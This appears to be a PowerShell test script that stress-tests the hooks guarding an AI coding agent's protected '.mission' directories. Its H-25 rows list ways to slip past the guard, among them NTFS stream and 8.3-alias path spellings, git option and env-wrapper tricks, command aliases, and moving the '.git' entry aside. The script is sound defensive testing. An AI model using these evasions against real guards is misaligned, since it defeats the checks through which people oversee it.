  EITHER reader). It returns because the scan's fall-through states a NEGATIVE EXISTENCE claim over
  the whole directory, which an unread candidate makes unprovable, and because continuing would
  authorize where the admission refuses -- the decider-versus-admission divergence H-21 and H-22
  exist to catch, on a third predicate.
"@
Check -Id 'H-23' -Title 'the installed pre-push decider REFUSES BY NAME when a candidate gate cannot be read, in its own return shape and without an exception escaping, while the same fixture with the handle released still authorizes' `
      -Ok $h23Ok -Detail $h23detail

# =============================================================================================
# H-24 -- WHERE IS THE HOOK REGISTRATION? THE ROOT, THIS CHECKOUT, A RUNNER WORKER'S TREE AND A
#         `git worktree add` TOOLING SEAT, MEASURED (WP-E, E-1; CONTROL-ONLY)
# =============================================================================================
# THE REGISTERED FINDING: "THE EVIDENCE GUARD IS NOT LIVE AS A PreToolUse HOOK IN WORKTREE TOOLING
# SEATS ... FIRST MEMBER: WHERE ARE HOOKS REGISTERED IN A LINKED WORKTREE?" This member is that first
# member. It MEASURES AND PRINTS A TABLE and asserts nothing about what it finds, because whether a
# registration is present is a property of the HOST, not of the commit under test -- the location-dependent
# class the register already carries, which this member must not join. Its output is the table, and LAM-ACCEPT
# claims nothing about the registration beyond what the table says.
#
# THE ROWS are the registration surface a Claude Code session reads for this repository: the .claude
# directory; .claude/settings.json, where the root registers its four hooks (LAM-INSTALL section 2);
# .claude/settings.local.json, the root's local settings (autoMemoryEnabled false); the
# four scripts that registration names; and .worktreeinclude, the runner's placement plan (WP-5 K-2).
# THE COLUMNS:
#   tracked  `git ls-tree HEAD` names it at this checkout's HEAD;
#   ignored  `git check-ignore --no-index` matches it under this checkout's rules;
#   root     present in the MAIN checkout -- the parent of the common git dir;
#   here     present in THIS checkout, the tree the instrument runs from;
#   worker   in a runner worker's tree: tracked, OR placed -- listed at the main checkout by
#            `ls-files --others --ignored --exclude-from=.worktreeinclude` AND by `... --exclude-standard`
#            (the two lists mission-dispatch.ps1 intersects), not tracked, and a plain file on disk there;
#   seat     in a tooling seat's tree cut by `git worktree add`: every TRACKED file and nothing else. That
#            is the CONVENTION, stated (.worktreeinclude's own header says it), so this column equals
#            `tracked` by construction.
# AND, PRESENCE AND SIZE ONLY, NO CONTENT OPENED: the user settings file and the documented Windows
# managed-settings paths. The only claim made from a size is that a file under 12 bytes cannot carry a hooks
# key (the shortest JSON that does is {"hooks":{}}). AND a census of this repository's registered linked
# worktrees: how many carry .claude/settings.json, by parent directory.
#
# PASS MEANS THE MEASUREMENT COMPLETED: every cell determined (no git call failed). The worker column contains
# the seat column BY CONSTRUCTION (worker = tracked or placed, seat = tracked), so that line is printed as a
# statement of the convention and asserts nothing (found in review). PASS does not mean any tree
# is guarded.
$h24Ok = $true
$h24Undetermined = New-Object System.Collections.Generic.List[string]
$h24Lines = New-Object System.Collections.Generic.List[string]
$h24Cl = '.cl' + 'aude'
function Get-Wp1H24Git {
    # git through the H-18 helper (no config, no hooks, stderr kept out of this file's EAP=Stop). Lines only.
    param([string]$Dir, [string[]]$GitArgs)
    $r = Invoke-Wp1H18Git -Dir $Dir -GitArgs $GitArgs
    return [pscustomobject]@{ code = $r.code; lines = @(([string]$r.out) -split "`r?`n" | Where-Object { $_ }) }
}
function Format-Wp1H24Cell {
    param($Value)
    if ($null -eq $Value) { return '?' }
    if ($Value) { return 'yes' }
    return 'no'
}
try {
    $h24DotGit = Join-Path $repoRoot '.git'
    $h24HereKind = if ([System.IO.File]::Exists($h24DotGit)) { 'a LINKED worktree (its .git is a FILE)' }
                   elseif ([System.IO.Directory]::Exists($h24DotGit)) { 'the MAIN checkout (its .git is a DIRECTORY)' }
                   else { 'UNDETERMINED (no .git entry at the tree root)' }
    $h24Common = Get-Wp1H24Git -Dir $repoRoot -GitArgs @('rev-parse', '--path-format=absolute', '--git-common-dir')
    $h24Main = ''
    if ($h24Common.code -eq 0 -and $h24Common.lines.Count -ge 1) {
        $h24Cd = ([string]$h24Common.lines[0]).Trim().Replace('/', '\').TrimEnd('\')
        if ((Split-Path -Leaf $h24Cd) -eq '.git') { $h24Main = Split-Path -Parent $h24Cd }
    }
    if (-not $h24Main) { [void]$h24Undetermined.Add('the main checkout (git-common-dir: ' + ($h24Common.lines -join ' ') + ')') }
    $h24Wti = if ($h24Main) { Join-Path $h24Main '.worktreeinclude' } else { '' }
    $h24Items = @(
        [pscustomobject]@{ rel = $h24Cl;                                                   dir = $true;  what = 'the directory' }
        [pscustomobject]@{ rel = $h24Cl + '/settings.json';                                dir = $false; what = 'the four hook registrations (LAM-INSTALL section 2)' }
        [pscustomobject]@{ rel = $h24Cl + '/settings.local.json';                          dir = $false; what = 'the root local settings' }
        [pscustomobject]@{ rel = 'tools/evidence-hooks-next/hooks/evidence-guard-pretooluse.ps1'; dir = $false; what = 'registered PreToolUse script' }
        [pscustomobject]@{ rel = 'tools/evidence-hooks-next/hooks/evidence-post-tool-use.ps1';    dir = $false; what = 'registered PostToolUse script' }
        [pscustomobject]@{ rel = 'tools/evidence-hooks-next/hooks/evidence-stop-finalize.ps1';    dir = $false; what = 'registered Stop script' }
        [pscustomobject]@{ rel = 'tools/evidence-hooks-next/hooks/evidence-pre-compact.ps1';      dir = $false; what = 'registered PreCompact script' }
        [pscustomobject]@{ rel = '.worktreeinclude';                                       dir = $false; what = 'the runner placement plan' }
    )
    $h24Worker = @{}
    $h24Seat = @{}
    [void]$h24Lines.Add(('      {0,-64} {1,-7} {2,-7} {3,-5} {4,-5} {5,-6} {6}' -f 'surface', 'tracked', 'ignored', 'root', 'here', 'worker', 'seat'))
    foreach ($it in $h24Items) {
        $lsArgs = if ($it.dir) { @('ls-tree', '-r', '--name-only', 'HEAD', '--', $it.rel) } else { @('ls-tree', '--name-only', 'HEAD', '--', $it.rel) }
        $lt = Get-Wp1H24Git -Dir $repoRoot -GitArgs $lsArgs
        $tracked = $null
        if ($lt.code -eq 0) { $tracked = ($lt.lines.Count -gt 0) } else { [void]$h24Undetermined.Add('tracked: ' + $it.rel) }
        $probe = if ($it.dir) { $it.rel + '/' } else { $it.rel }
        $ci = Get-Wp1H24Git -Dir $repoRoot -GitArgs @('check-ignore', '-q', '--no-index', $probe)
        $ignored = $null
        if ($ci.code -eq 0) { $ignored = $true } elseif ($ci.code -eq 1) { $ignored = $false } else { [void]$h24Undetermined.Add('ignored: ' + $it.rel) }
        $rootP = if ($h24Main) { Test-Path -LiteralPath (Join-Path $h24Main $it.rel) } else { $null }
        $hereP = Test-Path -LiteralPath (Join-Path $repoRoot $it.rel)
        $placed = $false
        if (-not $it.dir) {
            if ($h24Main -and (Test-Path -LiteralPath $h24Wti)) {
                $lw = Get-Wp1H24Git -Dir $h24Main -GitArgs @('ls-files', '--others', '--ignored', ('--exclude-from=' + $h24Wti), '--', $it.rel)
                $ls = Get-Wp1H24Git -Dir $h24Main -GitArgs @('ls-files', '--others', '--ignored', '--exclude-standard', '--', $it.rel)
                if ($lw.code -ne 0 -or $ls.code -ne 0) { [void]$h24Undetermined.Add('placement: ' + $it.rel); $placed = $null }
                else {
                    $inW = @($lw.lines | Where-Object { $_ -eq $it.rel }).Count -gt 0
                    $inS = @($ls.lines | Where-Object { $_ -eq $it.rel }).Count -gt 0
                    $placed = $inW -and $inS -and (-not $tracked) -and (Test-Path -LiteralPath (Join-Path $h24Main $it.rel) -PathType Leaf)
                }
            } else { [void]$h24Undetermined.Add('placement: ' + $it.rel + ' (no main checkout or no .worktreeinclude there)'); $placed = $null }
        }
        $worker = if ($it.dir) { $null } elseif ($null -eq $tracked -or $null -eq $placed) { $null } else { [bool]($tracked -or $placed) }
        $h24Worker[$it.rel] = $worker
        $h24Seat[$it.rel] = $tracked
        [void]$h24Lines.Add(('      {0,-64} {1,-7} {2,-7} {3,-5} {4,-5} {5,-6} {6}' -f $it.rel, (Format-Wp1H24Cell $tracked), (Format-Wp1H24Cell $ignored),
            (Format-Wp1H24Cell $rootP), (Format-Wp1H24Cell $hereP), $(if ($it.dir) { '(dir)' } else { Format-Wp1H24Cell $worker }), (Format-Wp1H24Cell $tracked)))
        [void]$h24Lines.Add('            ' + $it.what)
    }
    # THE DIRECTORY ROW'S WORKER CELL is derived from its files: it exists in a worker's tree iff a file does.
    $h24DirWorker = $false
    foreach ($k in @($h24Worker.Keys)) { if ($k.StartsWith($h24Cl + '/') -and $h24Worker[$k]) { $h24DirWorker = $true } }
    # CONTAINMENT: a worker's tree holds every file a seat's tree holds (worker >= seat), on every row.
    $h24Contain = $true
    foreach ($k in @($h24Seat.Keys)) {
        if ($null -eq $h24Worker[$k] -and -not ($k -eq $h24Cl)) { continue }
        if ($h24Seat[$k] -and ($k -ne $h24Cl) -and -not $h24Worker[$k]) { $h24Contain = $false }
    }
    # THE HARNESS SCOPES OUTSIDE THE REPOSITORY, presence and size only.
    $h24UserSettings = Join-Path $env:USERPROFILE ($h24Cl + '\settings.json')
    $h24UserP = Test-Path -LiteralPath $h24UserSettings -PathType Leaf
    $h24UserLen = if ($h24UserP) { (Get-Item -LiteralPath $h24UserSettings).Length } else { 0 }
    $h24UserCan = if (-not $h24UserP) { 'no file' } elseif ($h24UserLen -lt 12) { 'NO -- under 12 bytes cannot carry a hooks key' } else { 'not established -- content not opened' }
    $h24Managed = @('C:\Program Files\ClaudeCode\managed-settings.json', 'C:\ProgramData\ClaudeCode\managed-settings.json')
    $h24ManagedLines = @($h24Managed | ForEach-Object { '        ' + $_ + ' : ' + $(if (Test-Path -LiteralPath $_) { 'PRESENT (content not opened)' } else { 'absent' }) })
    # THE CENSUS of this repository's registered linked worktrees.
    $h24Wl = Get-Wp1H24Git -Dir $repoRoot -GitArgs @('worktree', 'list', '--porcelain')
    $h24Census = @{}
    $h24CensusTotal = 0; $h24CensusWith = 0
    if ($h24Wl.code -ne 0) { [void]$h24Undetermined.Add('the worktree census') }
    else {
        foreach ($wl in $h24Wl.lines) {
            if (-not $wl.StartsWith('worktree ')) { continue }
            $wp = $wl.Substring(9).Trim().Replace('/', '\')
            if ($h24Main -and [string]::Equals($wp.TrimEnd('\'), $h24Main.TrimEnd('\'), [System.StringComparison]::OrdinalIgnoreCase)) { continue }
            $par = Split-Path -Parent $wp
            if (-not $h24Census.ContainsKey($par)) { $h24Census[$par] = @(0, 0) }
            $has = Test-Path -LiteralPath (Join-Path $wp ($h24Cl + '\settings.json')) -PathType Leaf
            $h24Census[$par] = @(($h24Census[$par][0] + 1), ($h24Census[$par][1] + $(if ($has) { 1 } else { 0 })))
            $h24CensusTotal++; if ($has) { $h24CensusWith++ }
        }
    }
    $h24CensusLines = @($h24Census.Keys | Sort-Object | ForEach-Object { ('        {0,-96} {1,3} tree(s), {2,3} with .claude/settings.json' -f $_, $h24Census[$_][0], $h24Census[$_][1]) })
    if ($h24Undetermined.Count -gt 0) { $h24Ok = $false }
    $h24RegHere   = Test-Path -LiteralPath (Join-Path $repoRoot ($h24Cl + '\settings.json')) -PathType Leaf
    $h24RegSeat   = [bool]$h24Seat[$h24Cl + '/settings.json']
    $h24RegWorker = $h24Worker[$h24Cl + '/settings.json']
} catch {
    # AN ABORT IS THE ABSENCE OF A MEASUREMENT, NOT A PASS.
    $h24Ok = $false
    [void]$h24Undetermined.Add(("H-24 THREW at script line {0}: {1}" -f $_.InvocationInfo.ScriptLineNumber, $_.Exception.Message))
    $h24HereKind = '(not measured)'; $h24Main = ''; $h24UserP = $false; $h24UserLen = 0; $h24UserCan = '(not measured)'
    $h24ManagedLines = @(); $h24CensusLines = @(); $h24CensusTotal = 0; $h24CensusWith = 0
    $h24RegHere = $null; $h24RegSeat = $null; $h24RegWorker = $null; $h24DirWorker = $null; $h24Contain = $false
}
$h24detail = @"
  THE HOOK REGISTRATION, MEASURED FROM WHERE THIS INSTRUMENT RUNS. A table,
  not a verdict on the host: PASS means every cell below was determined.
    this checkout : $repoRoot -- $h24HereKind
    main checkout : $(if ($h24Main) { $h24Main } else { 'UNDETERMINED' })
$($h24Lines -join "`n")
      .claude directory in a worker's tree (any of its files placed or tracked): $(Format-Wp1H24Cell $h24DirWorker)
    READ AS: a session's PROJECT hooks come from .claude/settings.json in the tree it starts in.
      a project registration in THIS checkout's own tree   : $(Format-Wp1H24Cell $h24RegHere)
      one in a runner worker's tree (tracked or placed)     : $(Format-Wp1H24Cell $h24RegWorker)
      one in a tooling seat's tree cut by git worktree add  : $(Format-Wp1H24Cell $h24RegSeat)   (= tracked at HEAD)
      worker column contains seat column on every row       : $h24Contain   (by construction: worker = tracked or placed; asserts nothing)
    OUTSIDE THE REPOSITORY, presence and size only:
      user settings  $h24UserSettings : $(if ($h24UserP) { 'PRESENT, ' + $h24UserLen + ' bytes' } else { 'absent' }) -- carries a hooks key: $h24UserCan
      managed settings (documented Windows paths):
$($h24ManagedLines -join "`n")
    REGISTERED LINKED WORKTREES OF THIS REPOSITORY ($h24CensusTotal; $h24CensusWith carry .claude/settings.json):
$($h24CensusLines -join "`n")
    undetermined cells: $($h24Undetermined.Count)   (expect 0)$(if ($h24Undetermined.Count -gt 0) { "`n      " + ($h24Undetermined -join "`n      ") } else { '' })
  WHAT IS NOT CLAIMED: that any tree is or is not guarded (this member opens no settings file and runs no
  session); what a user or managed file CONTAINS; and anything about a tree this repository does not list.
  WP-E's live probes (amendment 55) measured the harness side: a session started in a linked worktree loads
  no project settings from the main checkout.
"@
Check -Id 'H-24' -Title 'the hook registration surface is MEASURED from where the instrument runs -- tracked, ignored, root, here, runner worker and git-worktree-add seat -- with the harness scopes by presence and a census of the linked worktrees (control-only)' `
      -Ok $h24Ok -Detail $h24detail

# =============================================================================================
# H-25 -- THE SEAT TRIPWIRE: A MISSION-PLANE WRITE FROM A SESSION WHOSE PROJECT DIRECTORY IS A LINKED
#         WORKTREE IS REFUSED; THE ROOT, A GIT-DIR-ASSERTED FIXTURE, A SANDBOX AND THE READS NAMED ARE NOT
#         (WP-E, E-2; ruling (v); review round 1)
# =============================================================================================
# RULING (v): "a guard tripwire refuses writes under .mission/** and .mission-runtime/lam/**
# from a linked worktree (deny-side, fails safe; WP fixtures' git-dir assertion is the distinguishing
# fact)." The rule is the block above Get-EvidenceSeatSessionLink in the library under test. The SESSION is
# CLAUDE_PROJECT_DIR, and the rule reads the .git entry AT it (no walk: the library states why). This member
# drives the REAL hook (Invoke-Hook) over a HERMETIC fixture under the temp root, GIT_CEILING_DIRECTORIES set
# to that root, every git dir asserted inside the fixture before anything is written through it (the
# 2026-09-13 rule, H-18's helpers):
#   M  <base>\main                                   a main checkout: `git init`, one commit, and a
#                                                    submodule-shaped git dir M\.git\modules\sub holding HEAD;
#   W  <base>\main-worktrees\wt-D-E2W                a LINKED worktree of M (`git worktree add`);
#   F  W\.mission-runtime\wp1-h25-own                a fixture with ITS OWN git dir, nested inside W;
#   N  W\.mission-runtime\wp1-h25-plain              a directory with NO git dir, nested inside W -- the shape
#                                                    of WP-1's sandbox and the A1 negative suite's (H-4, H-14);
#   U  <base>\garbled                                a .git FILE carrying no gitdir line;
#   G  <base>\gone                                   a .git FILE naming a gitdir that does not exist;
#   R  <base>\rewritten                              a .git FILE naming M's own git dir;
#   S  <base>\submodule                              a .git FILE naming M\.git\modules\sub.
# THE GROUPS:
#   LINKED (session W, a seat) -- the write forms the guard classifies, into both planes and into W's own
#     .git, by both routes, in the spellings the rows name: DENY, each by THIS rule's sentence. RED FIRST:
#     before the cure every one of them ALLOWS; the RED transcripts were recorded with the cure.
#   UNREADABLE, REWRITTEN (sessions U, G, R) -- DENY: what cannot be established as a main checkout refuses.
#   WORKER (session W, LAM_DISPATCH set, W its own tree) -- .mission-runtime/lam and its own .git refused by
#     this rule; its OWN handoff still ALLOWED, by file tool and by git add (K-3 closed member 2 is not
#     narrowed); a ledger write refused by K-3's sentence, not this rule's.
#   ROOT (session M) -- the same writes ALLOWED, this rule's sentence nowhere; a root seat writing into W's
#     plane is a root seat and ALLOWED.
#   FIXTURE (session F) and SANDBOX (session N) -- ALLOWED: F's own git dir is the distinguishing fact, and
#     N, which has none, is no session root. The SANDBOX rows re-drive review round 1's blocker: the A1
#     negative suite's MUST-ALLOW rows N2 and H-14's commit message, from a sandbox inside a linked tree.
#   MESSAGE -- classified segments that write nothing in the plane: a commit message naming the plane, a
#     message FILE in the plane, a dry run, a relative path resolving out of the plane. ALLOWED.
#   READS -- twelve, each from the linked session AND from the root session: ALLOWED both times. Q1-Q3 are
#     read-only tools this rule skips; Q4-Q12 are shell verbs in neither of A1's write classes, which this
#     rule never judges -- they show the rule refuses no ordinary read, not how it reads one.
#   SHADOWED, CONTROL -- a destructive cmdlet naming the plane is refused by A1's own destructive tier first,
#     for every role (the rule's destructive route is shadowed there, and says so); a gate write from the root
#     must DENY by T-3, or the table is void.
#   NOT REACHED -- printed, never asserted: the bounds the library states.
# AND THE PREDICATES ASKED DIRECTLY: the session test over every fixture shape, and the territory test over a
# spelling table with controls in both directions.
$h25Ok = $true
$h25Void = $false
$h25Lines = New-Object System.Collections.Generic.List[string]
$h25Pred = New-Object System.Collections.Generic.List[string]
$h25Nr = New-Object System.Collections.Generic.List[string]
$h25F0 = [ordered]@{}
$h25Base = ''
$h25SavedProj = $env:CLAUDE_PROJECT_DIR
$h25SavedCeil = $env:GIT_CEILING_DIRECTORIES
$h25SavedWt = $env:LAM_WORKTREE
$h25SavedMdi = $env:MISSION_DISPATCH_ID
$h25DenyWant = 0; $h25DenyOk = 0; $h25AllowWant = 0; $h25AllowOk = 0; $h25Bad = 0
$h25FixtureOk = $false
$h25Reached = $false
$h25PredOk = $false
$m25  = '.mission'
$mr25 = '.mission' + '-runtime'
try {
    Remove-Item Env:\LAM_DISPATCH -ErrorAction SilentlyContinue
    Remove-Item Env:\LAM_WORKTREE -ErrorAction SilentlyContinue
    $env:MISSION_DISPATCH_ID = 'session-wp1-h25'
    $h25Base = Join-Path ([System.IO.Path]::GetTempPath()) ('lam-wp1-h25-' + [guid]::NewGuid().ToString('N').Substring(0, 10))
    $null = New-Item -ItemType Directory -Force -Path $h25Base | Out-Null
    $env:GIT_CEILING_DIRECTORIES = $h25Base
    $M = Join-Path $h25Base 'main'
    $W = Join-Path $h25Base 'main-worktrees\wt-D-E2W'
    $F = Join-Path $W ($mr25 + '\wp1-h25-own')
    $N = Join-Path $W ($mr25 + '\wp1-h25-plain')
    $U = Join-Path $h25Base 'garbled'
    $G = Join-Path $h25Base 'gone'
    $Rw = Join-Path $h25Base 'rewritten'
    $S = Join-Path $h25Base 'submodule'
    $enc25 = New-Object System.Text.UTF8Encoding($false)
    # ---- the fixture, each git dir asserted INSIDE the fixture before anything is written through it ----
    $gi = Invoke-Wp1H18Git -Dir $h25Base -GitArgs @('init', '-q', 'main')
    $h25F0['M: git init succeeded'] = ($gi.code -eq 0)
    $h25F0['M: its git dir lies inside M'] = (Test-Wp1H18GitDirInside -Dir $M -Inside $M)
    if ($h25F0['M: its git dir lies inside M']) {
        [System.IO.File]::WriteAllText((Join-Path $M 'seed.txt'), "seed`n", $enc25)
        $null = Invoke-Wp1H18Git -Dir $M -GitArgs @('add', 'seed.txt')
        $gc = Invoke-Wp1H18Git -Dir $M -GitArgs @('commit', '-q', '-m', 'seed')
        $h25F0['M: one commit'] = ($gc.code -eq 0)
        $gw = Invoke-Wp1H18Git -Dir $M -GitArgs @('worktree', 'add', '-q', '--detach', $W, 'HEAD')
        $h25F0['W: git worktree add succeeded'] = ($gw.code -eq 0)
        $h25F0['W: its .git is a FILE'] = [System.IO.File]::Exists((Join-Path $W '.git'))
        $h25F0['W: its git dir lies inside M\.git'] = (Test-Wp1H18GitDirInside -Dir $W -Inside (Join-Path $M '.git'))
        $null = New-Item -ItemType Directory -Force -Path (Join-Path $W $mr25) | Out-Null
        $gf = Invoke-Wp1H18Git -Dir (Join-Path $W $mr25) -GitArgs @('init', '-q', 'wp1-h25-own')
        $h25F0['F: git init succeeded'] = ($gf.code -eq 0)
        $h25F0['F: its git dir lies inside F (the 2026-09-13 assertion)'] = (Test-Wp1H18GitDirInside -Dir $F -Inside $F)
        $null = New-Item -ItemType Directory -Force -Path $N | Out-Null
        $h25F0['N: no git dir of its own -- git resolves it inside M\.git (W''s): the fall-through shape'] = (Test-Wp1H18GitDirInside -Dir $N -Inside (Join-Path $M '.git'))
        $sub = Join-Path $M '.git\modules\sub'
        $null = New-Item -ItemType Directory -Force -Path $sub | Out-Null
        [System.IO.File]::WriteAllText((Join-Path $sub 'HEAD'), "ref: refs/heads/main`n", $enc25)
        # THE 8.3 ALIAS of W's .mission, read the way H-18 reads one; absent is a RED sentence, never a skip.
        $null = New-Item -ItemType Directory -Force -Path (Join-Path $W ($m25 + '\ledger')) | Out-Null
        $h25Alias = ''
        try { $h25Alias = [string](New-Object -ComObject Scripting.FileSystemObject).GetFolder((Join-Path $W $m25)).ShortName } catch { $h25Alias = '' }
        $h25F0['W: the volume gives .mission an 8.3 alias (' + $h25Alias + ')'] = ($h25Alias -and ($h25Alias -ne $m25))
    }
    foreach ($pair in @(@($U, "this is not a gitdir line`n"), @($G, "gitdir: ../gone-nowhere/.git/worktrees/x`n"),
                        @($Rw, ("gitdir: " + (Join-Path $M '.git').Replace('\', '/') + "`n")), @($S, "gitdir: ../main/.git/modules/sub`n"))) {
        $null = New-Item -ItemType Directory -Force -Path $pair[0] | Out-Null
        [System.IO.File]::WriteAllText((Join-Path $pair[0] '.git'), $pair[1], $enc25)
    }
    $h25F0['the fixture lies outside the repository under test'] = -not ($h25Base.StartsWith($repoRoot, [System.StringComparison]::OrdinalIgnoreCase))
    $h25FixtureOk = (@($h25F0.Values | Where-Object { -not $_ }).Count -eq 0)

    function Invoke-H25Row {
        param($Row)
        if ($Row.proj) { $env:CLAUDE_PROJECT_DIR = $Row.proj } else { Remove-Item Env:\CLAUDE_PROJECT_DIR -ErrorAction SilentlyContinue }
        if ($Row.worker) { $env:LAM_DISPATCH = 'D-E2W'; $env:LAM_WORKTREE = $W } else { Remove-Item Env:\LAM_DISPATCH -ErrorAction SilentlyContinue; Remove-Item Env:\LAM_WORKTREE -ErrorAction SilentlyContinue }
        try {
            $payload = @{ session_id = 'session-wp1-h25'; hook_event_name = 'PreToolUse'; tool_name = $Row.tool
                          tool_input = $Row.ti; cwd = $Row.cwd } | ConvertTo-Json -Depth 8 -Compress
            $res = Invoke-Hook -Script 'evidence-guard-pretooluse.ps1' -Json $payload
        } finally {
            Remove-Item Env:\LAM_DISPATCH -ErrorAction SilentlyContinue
            Remove-Item Env:\LAM_WORKTREE -ErrorAction SilentlyContinue
            $env:CLAUDE_PROJECT_DIR = $sandbox
        }
        $gotDeny  = ($res.exit -eq 2) -and ($res.stdout -like '*"permissionDecision":"deny"*')
        $gotAllow = ($res.exit -eq 0) -and ($res.stdout -like '*"permissionDecision":"allow"*')
        $byTrip   = ($res.stdout -like '*SEAT TRIPWIRE*')
        return [pscustomobject]@{ deny = $gotDeny; allow = $gotAllow; trip = $byTrip; exit = $res.exit; out = $res.stdout }
    }
    function New-H25Row {
        param([string]$Id, [string]$Group, [string]$Proj, [bool]$Worker, [string]$Tool, $Ti, [string]$Cwd,
              [string]$Want, [string]$Rule, [string]$Why)
        return [pscustomobject]@{ id = $Id; group = $Group; proj = $Proj; worker = $Worker; tool = $Tool; ti = $Ti
                                  cwd = $Cwd; want = $Want; rule = $Rule; why = $Why }
    }
    $wl   = Join-Path $W ($m25 + '\ledger\entries.jsonl')
    $wlam = Join-Path $W ($mr25 + '\lam\helpers\h.py')
    $ml   = Join-Path $M ($m25 + '\ledger\entries.jsonl')
    $ads  = '::$INDEX_ALLOCATION'
    $rows = @()
    if ($h25FixtureOk) {
        # ---- LINKED: a seat whose session project directory is W. Every row DENY by THIS rule. ----------
        $rows += New-H25Row 'L1'  'LINKED' $W $false 'Write' @{ file_path = $wl; content = 'x' } $W 'deny' 'trip' 'Write, absolute, the ledger'
        $rows += New-H25Row 'L2'  'LINKED' $W $false 'Edit' @{ file_path = ($m25 + '/amendments/AM-9999.yaml'); old_string = 'a'; new_string = 'b' } $W 'deny' 'trip' 'Edit, RELATIVE, joined to the payload cwd'
        $rows += New-H25Row 'L3'  'LINKED' $W $false 'MultiEdit' @{ file_path = $wl; edits = @(@{ old_string = 'a'; new_string = 'b' }) } $W 'deny' 'trip' 'MultiEdit, top-level path'
        $rows += New-H25Row 'L4'  'LINKED' $W $false 'NotebookEdit' @{ notebook_path = (Join-Path $W ($mr25 + '\lam\n.ipynb')); new_source = 'x' } $W 'deny' 'trip' 'NotebookEdit into .mission-runtime/lam'
        $rows += New-H25Row 'L5'  'LINKED' $W $false 'Write' @{ file_path = $wlam; content = 'x' } $W 'deny' 'trip' 'Write into .mission-runtime/lam'
        $rows += New-H25Row 'L6'  'LINKED' $W $false 'Write' @{ file_path = $ml; content = 'x' } $W 'deny' 'trip' "the ROOT checkout's plane, written from the linked session"
        $rows += New-H25Row 'L7'  'LINKED' $W $false 'Write' @{ file_path = ($m25 + '/ledger/entries.jsonl'); content = 'x' } $M 'deny' 'trip' 'the linked seat cd''d to the ROOT: the payload cwd is M, the session is still W'
        $rows += New-H25Row 'L8'  'LINKED' $W $false 'Bash' @{ command = ('git add ' + $m25 + '/ledger/entries.jsonl') } $W 'deny' 'trip' 'git add (A1 staging class)'
        $rows += New-H25Row 'L9'  'LINKED' $W $false 'PowerShell' @{ command = ('git commit -q -F msg.txt -- ' + $m25 + '/ledger/entries.jsonl') } $W 'deny' 'trip' 'git commit with a plane pathspec, through the other shell tool'
        $rows += New-H25Row 'L10' 'LINKED' $W $false 'Bash' @{ command = ('git add -f ' + $mr25 + '/lam/helpers/h.py') } $W 'deny' 'trip' 'git add -f into .mission-runtime/lam'
        $rows += New-H25Row 'L11' 'LINKED' $W $false 'Write' @{ file_path = (Join-Path $W '.MISSION\Ledger\entries.jsonl'); content = 'x' } $W 'deny' 'trip' 'CASE: the filesystem opens the same file'
        $rows += New-H25Row 'L12' 'LINKED' $W $false 'Write' @{ file_path = (Join-Path $W ($m25 + '.\ledger\entries.jsonl')); content = 'x' } $W 'deny' 'trip' 'a TRAILING DOT on the component (Win32 strips it)'
        $rows += New-H25Row 'L13' 'LINKED' $W $false 'Write' @{ file_path = ('\\?\' + $wl); content = 'x' } $W 'deny' 'trip' 'the EXTENDED-LENGTH prefix'
        $rows += New-H25Row 'L14' 'LINKED' $W $false 'FileWrite' @{ file_path = (Join-Path $W ($m25 + '\x.yaml')); content = 'x' } $W 'deny' 'trip' 'an UNKNOWN write-tool name (the file-tool branch is an inverted allow-list)'
        $rows += New-H25Row 'L15' 'LINKED' $W $false 'MultiEdit' @{ edits = @(@{ file_path = (Join-Path $W ($m25 + '\y.yaml')); old_string = 'a'; new_string = 'b' }) } $W 'deny' 'trip' 'the path NESTED under edits[] (the depth walk)'
        $rows += New-H25Row 'L16' 'LINKED' $W $false 'Write' @{ file_path = (Join-Path $W ($mr25 + '\lam')); content = 'x' } $W 'deny' 'trip' 'the .mission-runtime/lam directory itself'
        $rows += New-H25Row 'L17' 'LINKED' $W $false 'Write' @{ file_path = (Join-Path $W ('src\..\' + $m25 + '\z.yaml')); content = 'x' } $W 'deny' 'trip' 'a dot segment that RESOLVES INTO the plane'
        $rows += New-H25Row 'L18' 'LINKED' $W $false 'Write' @{ file_path = (Join-Path $W ($m25 + $ads + '\ledger\entries.jsonl')); content = 'x' } $W 'deny' 'trip' 'the NTFS stream spelling .mission::$INDEX_ALLOCATION (found in review)'
        $rows += New-H25Row 'L19' 'LINKED' $W $false 'Write' @{ file_path = (Join-Path $W ($mr25 + '\lam' + $ads + '\helpers\h.py')); content = 'x' } $W 'deny' 'trip' 'the stream spelling on .mission-runtime/lam (found in review)'
        $rows += New-H25Row 'L20' 'LINKED' $W $false 'Bash' @{ command = ('git add :' + $m25 + '/ledger/entries.jsonl') } $W 'deny' 'trip' 'git''s colon pathspec :.mission/... (found in review)'
        $rows += New-H25Row 'L21' 'LINKED' $W $false 'Write' @{ file_path = (Join-Path $W '.git'); content = 'gitdir: x' } $W 'deny' 'trip' 'the session''s OWN .git entry, the fact the rule reads (found in review)'
        $rows += New-H25Row 'L22' 'LINKED' $W $false 'Bash' @{ command = 'mv .git .git.bak' } $W 'deny' 'trip' 'moving the session''s own .git aside (A1 destructive class; found in review)'
        $rows += New-H25Row 'L23' 'LINKED' $W $false 'Bash' @{ command = ('git -c core.autocrlf=false add ' + $m25 + '/ledger/entries.jsonl') } $W 'deny' 'trip' 'a git global option before the subcommand (found in review)'
        $rows += New-H25Row 'L24' 'LINKED' $W $false 'Bash' @{ command = ('git -C . add ' + $m25 + '/ledger/entries.jsonl') } $W 'deny' 'trip' 'git -C <dir> before the subcommand (found in review)'
        $rows += New-H25Row 'L25' 'LINKED' $W $false 'Bash' @{ command = ('env GIT_X=1 git add ' + $m25 + '/ledger/entries.jsonl') } $W 'deny' 'trip' 'the env wrapper and its NAME=VALUE word (found in review)'
        $rows += New-H25Row 'L26' 'LINKED' $W $false 'Bash' @{ command = ('rm.exe ' + $mr25 + '/lam/helpers/h.py') } $W 'deny' 'trip' 'an .exe suffix on a destructive verb (found in review)'
        $rows += New-H25Row 'L27' 'LINKED' $W $false 'PowerShell' @{ command = ('ri ' + $mr25 + '\lam\helpers\h.py') } $W 'deny' 'trip' 'a PowerShell alias of Remove-Item (found in review)'
        $rows += New-H25Row 'L28' 'LINKED' $W $false 'Write' @{ file_path = (Join-Path $W ($h25Alias + '\ledger\entries.jsonl')); content = 'x' } $W 'deny' 'trip' ('the 8.3 ALIAS ' + $h25Alias + ' of .mission')
        $rows += New-H25Row 'L29' 'LINKED' $W $false 'Bash' @{ command = 'git add docs/x.md' } (Join-Path $W ($m25 + '\ledger')) 'deny' 'trip' 'a relative path staged from a cwd INSIDE the plane lands in it (found in review: the target named is the path, not the verb)'
